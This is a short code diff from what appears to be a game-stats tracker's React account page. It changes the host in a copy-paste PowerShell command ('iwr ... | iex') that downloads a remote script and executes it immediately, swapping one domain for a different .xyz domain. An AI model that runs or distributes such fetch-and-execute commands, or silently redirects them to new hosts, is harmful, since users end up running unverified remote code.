@@ -26,7 +26,7 @@ const Account = () => {
         setIsSidebarOpen(!isSidebarOpen);
     };
 
-    const powershellScript = `iwr -useb "https://wuwutracker.com/import.ps1" | iex`;
+    const powershellScript = `iwr -useb "https://wuwastats.xyz/history.ps1" | iex`;
 
     useEffect(() => {
         const images = document.querySelectorAll('img');
